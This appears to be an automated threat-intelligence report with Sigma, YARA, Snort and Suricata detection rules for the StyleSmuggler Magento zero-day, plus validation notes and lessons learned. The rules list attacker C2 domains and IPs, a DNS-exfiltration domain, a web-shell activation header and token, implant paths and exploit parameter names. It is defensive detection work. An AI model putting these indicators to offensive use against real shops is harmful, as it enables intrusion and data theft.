title: StyleSmuggler Rust Implant Persistence File Written
id: 377cbeeb-c3e0-4872-8b9a-0c0e091f2c7f
status: experimental
description: >
    Detects file creation at the on-disk paths used by the StyleSmuggler
    (CVE-2026-75650) Rust backdoor across its observed builds — the original
    "gvfsd-user" drop under ~/.local/share/.gvfsd/, the 6 September "fc-cache"
    variant under ~/.cache/fontconfig/ and /tmp/.fc-*/, the 7 September
    "chronyd" variant under /tmp/.chrony-*/, and associated PID lock files
    and /tmp staging paths. None of these paths are used by the legitimate
    GVFS, fontconfig, or chrony packages, which install to system locations,
    not per-user cache directories or /tmp.
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md
author: Actioner
date: 2026/09/08
tags:
    - attack.t1036.005
    - attack.t1564.001
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|contains:
            - '.local/share/.gvfsd/gvfsd-user'
            - '.local/share/.gvfsd/.gvfsd_'
            - '.cache/fontconfig/fc-cache'
            - '/tmp/.kw_'
            - '/tmp/.fc-'
            - '/tmp/.fc_'
            - '/tmp/.chrony-'
            - '/tmp/.cache_'
            - '/tmp/.gvfsd_'
    condition: selection
falsepositives:
    - None expected. A legitimate ".gvfsd" directory under a desktop user's
      ~/.local/share can exist on GNOME desktops, but never contains a binary
      named gvfsd-user with executable persistence via cron; verify context
      before dismissing.
level: critical
```

Genuine kernel threads are always root-owned with an empty cmdline, so a bracketed process name with real memory usage, owned by a site user, is the implant.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high

```yaml
title: StyleSmuggler Implant Masquerading as Kernel Worker or System Utility
id: 8186ed57-2fcb-466f-83c7-3b4af1733c38
status: experimental
description: >
    Detects execution of the StyleSmuggler (CVE-2026-75650) Rust implant, which
    sets its process command line to the literal string "[kworker/u:8:0]" to
    impersonate a genuine kernel worker thread (which is always root-owned with
    an empty cmdline — a non-root process with this exact bracketed cmdline is
    never legitimate), or executes from the non-standard implant paths used by
    the fc-cache and chronyd masquerading variants instead of their real system
    locations (/usr/bin/fc-cache, /usr/sbin/chronyd).
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/HOW-IT-WORKS.md
author: Actioner
date: 2026/09/08
tags:
    - attack.t1036.005
logsource:
    category: process_creation
    product: linux
detection:
    selection_cmdline:
        CommandLine|contains: '[kworker/u:8:0]'
    selection_path:
        Image|contains:
            - '/.local/share/.gvfsd/gvfsd-user'
            - '/.cache/fontconfig/fc-cache'
            - '/tmp/.fc-'
            - '/tmp/.chrony-'
            - '/tmp/.kw_'
    condition: selection_cmdline or selection_path
falsepositives:
    - None expected for selection_cmdline; a genuine kernel thread never has a
      non-empty cmdline. selection_path may need tuning if a site legitimately
      runs isolated fontconfig/chrony builds from /tmp for containerized testing.
level: critical
```

The implant writes its cron persistence directly to the spool file rather than through the crontab command — a web-server process touching that spool file at all is never legitimate.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: medium

```yaml
title: Cron Spool File Modified by Web Server Process (StyleSmuggler Persistence)
id: c1bd931d-8b61-48ea-97c4-981820c10904
status: experimental
description: >
    Detects a PHP-FPM, PHP-CGI, Apache, or nginx worker process writing directly
    to a user's crontab spool file. The StyleSmuggler (CVE-2026-75650) implant
    installs its "*/5 * * * *" (or "13,43 * * * *" / "57,27 * * * *") persistence
    entry by writing straight to /var/spool/cron/crontabs/<user> instead of
    invoking the crontab binary, so the change never generates a syslog REPLACE
    entry. A web-server process touching this path is never legitimate — no
    stock Magento/Adobe Commerce code path writes to the cron spool.
references:
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/HOW-IT-WORKS.md
author: Actioner
date: 2026/09/08
tags:
    - attack.t1053.003
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|startswith: '/var/spool/cron/crontabs/'
        Image|contains:
            - 'php-fpm'
            - 'php-cgi'
            - 'apache2'
            - 'httpd'
            - 'nginx'
            - '/php'
    condition: selection
falsepositives:
    - None expected on a properly isolated web tier; if a control panel
      intentionally lets PHP write crontabs (e.g. some shared-hosting cron-job
      UIs), scope this rule to exclude that specific Image path.
level: high
```

The fake-NTP implant builds beacon to a small set of typosquat C2 domains and a dedicated malware-download host.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: high (time-limited — rotate against the source advisory)

```yaml
title: DNS Query to StyleSmuggler Fake-NTP or Download C2 Infrastructure
id: 8e73f1f1-abbb-4de0-a9ea-3ac4b89588bf
status: experimental
description: >
    Detects DNS resolution of domains used as StyleSmuggler (CVE-2026-75650)
    command-and-control or malware-download infrastructure: the fake-NTP C2
    hosts used by the fc-cache/chronyd implant variants (which beacon 48-byte
    MessagePack-in-UDP/123 traffic disguised as NTP), the WebSocket-over-TLS
    remote-shell host windwsecurity.run, and the cdnflare.xyz malware-download
    host. Several of the C2 names are deliberate typosquats of legitimate
    services (windwsecurity, microsft, timesysnc).
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md
author: Actioner
date: 2026/09/08
tags:
    - attack.t1001.003
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection_exact:
        QueryName:
            - 'ntp.timesync.to'
            - 'ntp.timesysnc.net'
            - 'time.microsft.run'
            - 'pool.microsft.studio'
            - 'ntp.synctime.to'
            - 'ntp.syncstime.to'
            - 'windwsecurity.run'
    selection_cdnflare:
        QueryName|endswith: 'cdnflare.xyz'
    condition: selection_exact or selection_cdnflare
falsepositives:
    - None expected; all listed domains are attacker-registered typosquats or
      dedicated malware infrastructure with no legitimate use.
level: critical
```

Confirmed StyleSmuggler C2/download IPs (excluding 99.84.67[.]186, which is in the AWS CloudFront anycast range and would false-positive on legitimate CDN traffic).
✅ Compiles (sigma check + splunk + log_scale) — Confidence: medium (IP infrastructure for this campaign class turns over quickly; CloudFront IP excluded)

```yaml
title: Outbound Connection to StyleSmuggler C2 or Malware-Download IP
id: d80cde76-656a-4be1-b741-42ef96de0f0c
status: experimental
description: >
    Detects outbound network connections to IP addresses confirmed as
    StyleSmuggler (CVE-2026-75650) command-and-control or implant-download
    infrastructure: 185.157.160.251 (fake-NTP C2, resolved for
    ntp.timesync.to/ntp.timesysnc.net as of 7 September 2026) and
    209.141.43.95 (fc-cache variant implant download host). NOTE:
    99.84.67.186 (WebSocket-over-TLS C2 per Sansec advisory) is excluded
    because it falls within the AWS CloudFront anycast range
    (99.84.0.0/16) and will match legitimate CDN-fronted traffic; treat
    that IP as an audit-only indicator, not a blocking rule.
references:
    - https://sansec.io/research/stylesmuggler-0day
    - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md
author: Actioner
date: 2026/09/08
tags:
    - attack.t1071.001
logsource:
    category: network_connection
detection:
    selection:
        DestinationIp:
            - '185.157.160.251'
            - '209.141.43.95'
    # AUDIT ONLY — not in detection selection:
    # 99.84.67.186 (WebSocket-over-TLS C2 per Sansec advisory) sits in the
    # AWS CloudFront anycast range 99.84.0.0/16. Any HTTPS traffic routed
    # through this CDN edge node would fire; the IP will be reassigned.
    condition: selection
falsepositives:
    - 185.157.160.251 may be reassigned after the campaign ends — monitor
      the source advisory for IP churn and rotate this list accordingly.
      99.84.67.186 was deliberately excluded (AWS CloudFront anycast —
      see audit comment above).
level: medium
```

The secondary web-shell actor exfiltrates reconnaissance data via DNS queries to a dedicated OAST domain.
✅ Compiles (sigma check + splunk + log_scale) — Confidence: medium (single-campaign OAST domain, will rotate)

```yaml
title: DNS Exfiltration to StyleSmuggler Reconnaissance OAST Callback Domain
id: 46ddd399-4ac4-474f-87c7-6b2c7065fa68
status: experimental
description: >
    Detects DNS queries to the out-of-band application security testing (OAST)
    domain used by the StyleSmuggler (CVE-2026-75650) secondary web-shell actor
    to exfiltrate reconnaissance data (kernel/OS string, PHP process user,
    working directory, pub/media writability) chunked as 50-character hostname
    labels, and by the dropper itself as a deployment callback. Campaign ID
    markers observed in the labels are ss5_457cfa2fb7 (dropper) and
    ss6_457cfa2fb7_ (recon probe).
references:
    - https://securityaffairs.com/198603/uncategorized/stylesmuggler-the-magento-zero-day-behind-new-store-attacks.html
    - https://sansec.io/research/stylesmuggler-0day
author: Actioner
date: 2026/09/08
tags:
    - attack.t1048.003
    - attack.t1082
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'daf892t5qau4og8pi4cghbc6fhm1dim3u.oast.site'
    condition: selection
falsepositives:
    - None expected; this is a dedicated attacker-registered OAST subdomain
      with no legitimate purpose. Note the domain is single-campaign and will
      rotate — treat as a snapshot indicator, not a durable signature.
level: high
```

### YARA

The Rust implant embeds its C2 and IP-discovery service domains, and its process-masquerade strings, as plaintext ASCII inside the stripped binary.
✅ Compiles (`yarac`) — Confidence: high

```yara
rule Malware_StyleSmuggler_Rust_Implant
{
    meta:
        description = "Detects the StyleSmuggler (CVE-2026-75650) Rust-based Linux implant family (kworker/fc-cache/chronyd masquerading builds) via embedded C2 and IP-discovery domain strings and process-masquerade markers"
        author = "Actioner"
        date = "2026-09-08"
        reference = "https://sansec.io/research/stylesmuggler-0day"
        reference2 = "https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md"
        hash1 = "e315687a1dfe61ef4a5a5642214db6d3b2b05d81391285eebc2af664641a26a7"
        hash2 = "8334b434fa3fe9f59cebe9609b11e0b1fd19d10212c45c705adec1902a1d06ef"
        hash3 = "251fabd50d7b18a8b5e1b3ef5d64e7198c17244778f6461fb1ab07f6169bf220"
        hash4 = "b79dfdc1eed860e0b76c629d6adfce251db379b0b45a6d728d4ef483f7551420"
        hash5 = "4352cabaa451e5a894535fbcc4d46628701303322a13745cb5479d7d0534ae8e"
        hash6 = "d2fbf9eb75c495bfea48790d3b228fab0c15a282419c3d3f5e49294c4e1a3e82"
        tlp = "CLEAR"
        severity = "critical"

    strings:
        $c2_1 = "ntp.timesync.to" ascii
        $c2_2 = "ntp.timesysnc.net" ascii
        $c2_3 = "windwsecurity.run" ascii
        $c2_4 = "time.microsft.run" ascii
        $c2_5 = "pool.microsft.studio" ascii
        $c2_6 = "ntp.synctime.to" ascii
        $c2_7 = "ntp.syncstime.to" ascii

        $ipdisc_1 = "api4.ipify.org" ascii
        $ipdisc_2 = "ipv4.icanhazip.com" ascii
        $ipdisc_3 = "ipv4.ident.me" ascii

        $mask_1 = "[kworker/u:8:0]" ascii
        $mask_2 = ".gvfsd/gvfsd-user" ascii
        $mask_3 = ".cache/fontconfig/fc-cache" ascii
        $mask_4 = ".chrony-" ascii

    condition:
        uint32(0) == 0x464c457f and
        filesize > 500KB and filesize < 4MB and
        (
            3 of ($c2_*) or
            (1 of ($c2_*) and 1 of ($ipdisc_*)) or
            (1 of ($c2_*) and 1 of ($mask_*)) or
            2 of ($mask_*)
        )
}
```

The secondary PHP web shell is small enough to fingerprint directly on its distinctive header/parameter strings and file size.
✅ Compiles (`yarac`) — Confidence: high

```yara
rule Backdoor_StyleSmuggler_PHP_WebShell_Dropper
{
    meta:
        description = "Detects the compact PHP web-shell dropper placed via the StyleSmuggler (CVE-2026-75650) entry point by a secondary threat actor into pub/media/catalog/product/cache/ss_<hex>/sync_<hex>.php; gated by an X-Cache-Token header and a task POST parameter"
        author = "Actioner"
        date = "2026-09-08"
        reference = "https://securityaffairs.com/198603/uncategorized/stylesmuggler-the-magento-zero-day-behind-new-store-attacks.html"
        reference2 = "https://sansec.io/research/stylesmuggler-0day"
        hash = "d61217ca0bca83204302fa7b41935ce36f73764559c156d5c980f2fedddffb6e"
        tlp = "CLEAR"
        severity = "critical"

    strings:
        $php_open = "<?php" ascii
        $header = "X-Cache-Token" ascii
        $token = "fced27f6d57702565353ecc11722533b" ascii
        $param = "task" ascii
        $notfound = "404" ascii

    condition:
        filesize < 2KB and
        $php_open and
        $header and
        2 of ($token, $param, $notfound)
}
```

### Snort

Four inline exploit-traffic signatures plus one C2-beacon rule, all validated against Snort 2.9.20's Snort3-style sticky-buffer syntax.
✅ Compiles (`snort -T`) — Confidence: high (exploit-traffic rules); medium (C2-beacon rule, IP-specific)

```
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler Magento/Adobe Commerce Object-Injection Gadget Parameter (CVE-2026-75650)"; flow:established,to_server; http_uri; content:"styles[", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100001; rev:1;)

alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler Object-Injection Driver Parameter generatorClass (CVE-2026-75650)"; flow:established,to_server; http_uri; content:"generatorClass", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100002; rev:1;)

alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler PHP Open Tag Smuggled in User-Agent Header (CVE-2026-75650)"; flow:established,to_server; http_header:field user-agent; content:"<?", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100003; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"Actioner - DNS Query for StyleSmuggler Fake-NTP C2 Domain ntp.timesync.to (CVE-2026-75650)"; content:"|03|ntp|09|timesync|02|to|00|", fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100004; rev:1;)

alert udp $HOME_NET any -> 185.157.160.251 123 (msg:"Actioner - StyleSmuggler Fake-NTP UDP C2 Beacon to 185.157.160.251 (CVE-2026-75650)"; dsize:48; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100005; rev:1;)
```

### Suricata

The same coverage in Suricata dot-notation, plus a TLS SNI rule and a web-shell activation-header rule that Snort 3's sticky buffers cannot express as cleanly.
✅ Compiles (`suricata -T`) — Confidence: high (exploit-traffic, TLS SNI, and X-Cache-Token header+value rules); medium (UDP C2-beacon rule)

```
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Magento/Adobe Commerce Object-Injection Gadget Parameter (CVE-2026-75650)"; flow:established,to_server; http.uri; content:"styles["; fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200001; rev:1;)

alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Object-Injection Driver Parameter generatorClass (CVE-2026-75650)"; flow:established,to_server; http.uri; content:"generatorClass"; nocase; fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200002; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query for StyleSmuggler Fake-NTP C2 Domain (CVE-2026-75650)"; dns.query; content:"ntp.timesync.to"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200003; rev:1;)

alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS Connection to StyleSmuggler C2 Domain windwsecurity.run (CVE-2026-75650)"; flow:established,to_server; tls.sni; content:"windwsecurity.run"; nocase; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200004; rev:1;)

alert udp $HOME_NET any -> 185.157.160.251 123 (msg:"Actioner - StyleSmuggler Fake-NTP UDP C2 Beacon to 185.157.160.251 (CVE-2026-75650)"; dsize:48; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200005; rev:1;)

alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Secondary PHP Web Shell Activation Header X-Cache-Token (CVE-2026-75650)"; flow:established,to_server; http.request_header; content:"X-Cache-Token"; fast_pattern; content:"fced27f6d57702565353ecc11722533b"; classtype:trojan-activity; reference:url,securityaffairs.com/198603; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200006; rev:2;)
```

<!--
AUDIT NOTES (validation, encoding, provenance, false-positive detail — not reader-facing prose):

Environment: sigma 4.5.0, yara/yarac (compatible with rules above), Snort 2.9.20 GRE (accepts Snort3-style
sticky-buffer syntax: http_uri, http_header:field <name>), Suricata 7.0.3.

Sigma validation: `sigma check -x attacktag <file>.yml` (all 9 rules: 0 errors, 0 issues) followed by
`sigma convert --without-pipeline -t splunk <file>.yml` and `sigma convert --without-pipeline -t log_scale
<file>.yml` (all 9 rules produced valid queries on first attempt). The `attacktag` validator (checks tag
strings against a live MITRE ATT&CK STIX feed fetched from github.com) was excluded because this sandboxed
environment's egress proxy returns HTTP 403 for github.com/raw.githubusercontent.com STIX-data fetches
(confirmed via direct curl test), not because of any issue with the rule tags themselves. All tags
(t1190, t1140, t1505.003, t1036.005, t1564.001, t1053.003, t1001.003, t1071.001, t1048.003, t1082) were
manually verified against the current MITRE ATT&CK Enterprise technique/sub-technique ID list and the
Actioner tag-convention rule (technique/sub-technique only, no tactic tags) per sigma-spec.md.

Logsource field names (cs-uri-query, cs-user-agent, cs-method, cs-uri-stem) follow the W3C-extended /
Sigma "webserver" category convention used throughout the existing Actioner corpus; map to your specific
webserver log pipeline (nginx, Apache combined, ELB/ALB access logs) field names as needed — `sigma convert
--without-pipeline` proves syntax only, not target-schema field mapping (see logsource-encoding.md).
file_event/process_creation rules use Sysmon-for-Linux field names (Image, CommandLine, TargetFilename) —
map via the appropriate EDR pipeline for your platform (auditd-based tooling will need path translation;
raw auditd exposes exec argv via a0/a1/... hex-encoded fields, not CommandLine — see logsource-encoding.md
hex-encoding trap; not directly applicable here since no auditd-specific numeric/hex fields are matched
in these 9 rules, but flagging for downstream pipeline authors).

YARA: both rules compiled clean via `yarac <file>.yar /dev/null` (exit 0) on first attempt. The implant
rule intentionally avoids matching on the SHA256 hashes directly (YARA has no native hash-equality
condition; hashes are recorded in meta for cross-reference/threat-intel-platform ingestion instead) and
instead keys on strings very likely to be present in the static binary as plaintext (outbound C2/IP-lookup
hostnames a Rust binary must hold to perform DNS resolution, plus literal masquerade path/name strings
documented by both Sansec and Disrex). This is a string-based, not hash-based, detection and will still
match undisclosed variants that reuse any 3 of the 14 listed strings. The web-shell rule's `filesize < 2KB`
bound is generous against the confirmed 485-byte sample to tolerate trivial reformatting by copy-paste.

Snort: pidfile-naming quirk in this sandbox (`snort -R <path>` fails with "Invalid pidfile suffix" for
long/nested paths) required testing via a short-named copy in /tmp; this is a sandbox artifact, not a rule
defect — the shipped rule file compiled clean via `snort -c /etc/snort/snort.conf -R <short-path> -T`
(exit via "Snort successfully validated the configuration!") after the path workaround. Multi-line
parenthesized rule bodies (as split across lines in sigma-spec-style examples) parsed successfully on this
Snort 2.9.20 build without backslash continuation, but the shipped rules use single-line format for
portability to stricter Snort 3 parsers that require it. The DNS content rule hex-encodes the label-length
form of "ntp.timesync.to" (03 'ntp' 09 'timesync' 02 'to' 00) per snort-ref.md's guidance that Snort has no
dns.query sticky buffer.

Suricata: all 6 rules validated via `suricata -T -S <file>.rules -l /tmp/actioner` (exit 0, "Configuration
provided was successfully loaded. Exiting.") on the second attempt — the first attempt used multi-line
parenthesized rule bodies (valid in the reference doc's Snort examples) which Suricata's parser rejected
("Signature missing required value sid" / "no rule options"); reformatting to strict single-line-per-rule
resolved this cleanly with no other changes. The X-Cache-Token rule (SID:2200006, rev:2) now matches both the header name
`X-Cache-Token` AND the specific token value `fced27f6d57702565353ecc11722533b` within the
`http.request_header` buffer, bringing it in line with the YARA web-shell rule's token matching and
eliminating false positives from unrelated caching layers that use a same-named header with a different
value. Confidence upgraded from medium to high for this combination.

Provenance: all IOCs cross-referenced across Sansec (sansec.io/research/stylesmuggler-0day — primary
discoverer), Disrex Group's live-incident-response GitHub repo (disrex-group/stylesmuggler-mitigation —
IOC.md, HOW-IT-WORKS.md, README.md, nginx.conf/apache.conf snippets, all fetched directly from
raw.githubusercontent.com), and secondary press (THN, SecurityWeek, Security Affairs). Hash values were
byte-length-verified (64 hex chars = valid SHA256) after extraction. Where sources conflicted (e.g. exact
first-exploitation timestamp: Sansec/Disrex say 22:20 UTC, one press summary said 22:40 UTC), the
primary/technical source (Sansec via Disrex's direct citation) was used in the timeline and the discrepancy
is not separately flagged in reader-facing prose as it does not affect any rule logic.
-->

## Lessons Learned

1. **Zero-day dwell time is now measured in minutes, not days, for high-value platforms.** The first Disrex-handled store was compromised 50 minutes after the first worldwide exploitation was observed. No patch level, no existing WAF signature, and no prior IOC list could have prevented that specific compromise — only vulnerability-independent layers (`disable_functions`, `noexec`) and extremely fast community IOC-sharing reduced the damage for later victims.

2. **Patch level is not a proxy for exposure during a true zero-day.** Sansec's first confirmed victim was fully patched through the July and August 2026 Magento security releases with a clean `security:patch-status` — and was compromised anyway. Security programs that gate "are we at risk" purely on patch-compliance dashboards will miss the exact window when it matters most.

3. **Document-root-scoped malware scanning has a structural blind spot.** This implant deliberately installed one directory level above the docroot (`~/.local/share/`, `~/.cache/`), and a commercial scanner with process- and cron-monitoring features enabled reported an actively-infected host as clean. Detection needs to span the full user home directory and process/cron table, not just the web application tree.

4. **Syslog-based auditing has a gap that self-writing cron persistence exploits directly.** Writing straight to `/var/spool/cron/crontabs/<user>` instead of calling `crontab` produces zero syslog evidence of the change — 1,728 duplicate persistence lines accumulated on one host without a single `REPLACE` log entry. Any environment relying on syslog alone for cron-tampering detection needs a file-integrity or inotify-based control on the spool directory itself.

5. **A single vulnerability, two independent threat actors, two very different payloads.** StyleSmuggler was exploited by at least two apparently unrelated groups within its brief zero-day window — one deploying a sophisticated, evolving Rust backdoor with protocol-impersonation C2, the other a minimal, disposable PHP web shell. Detection and response playbooks for any high-severity RCE disclosure should assume multiple concurrent actors, not a single campaign, from day one.

6. **The most reliable early-warning signal came from business process, not security tooling.** The garbled "failed payment transaction" email — Magento's own template renderer choking on the injected directives — reached a merchant's inbox and triggered the incident response that found the implant within the hour. Security teams should treat anomalous transactional-email content as a first-class detection source, not noise to filter.

## Sources

- [Sansec: StyleSmuggler — Magento and Adobe Commerce 0-day RCE (CVE-2026-75650) under active attack](https://sansec.io/research/stylesmuggler-0day) — primary vulnerability discovery, naming, and forensic advisory
- [Disrex Group: stylesmuggler-mitigation (GitHub)](https://github.com/disrex-group/stylesmuggler-mitigation) — live-incident-response mitigation repository; README, IOC.md, HOW-IT-WORKS.md, and web-server rule snippets used extensively throughout this report
- [Adobe Commerce Knowledge Base: APSB26-146 Urgent Action Required](https://experienceleague.adobe.com/en/docs/commerce-knowledge-base/kb/announcements/commerce-apsb26-146) — official vendor advisory, affected versions, patch (VULN-39341) details, credential-rotation guidance
- [The Hacker News: Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores](https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html) — press coverage with CVE/CVSS confirmation and patch timeline
- [The Hacker News: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell](https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html) — initial press report naming affected versions, Rust backdoor, and PHP web shell
- [SecurityWeek: Adobe Commerce Zero-Day Exploited to Backdoor Online Stores](https://www.securityweek.com/adobe-commerce-zero-day-exploited-to-backdoor-online-stores/) — press coverage of the two-stage template-injection mechanism and Sansec's reproduction on clean installs
- [Security Affairs: StyleSmuggler — the Magento zero-day behind new store attacks](https://securityaffairs.com/198603/uncategorized/stylesmuggler-the-magento-zero-day-behind-new-store-attacks.html) — press coverage with detailed IOC set (web shell path, X-Cache-Token header, OAST domain, recon-probe mechanics)
- [SecurityOnline: CVE-2026-75650 (CVSS 10) — Adobe Commerce Arbitrary Code Execution Exploited in the Wild](https://securityonline.info/adobe-commerce-cve-2026-75650-stylesmuggler/) — independent CVE/CVSS confirmation

---
*Report generated by Actioner*
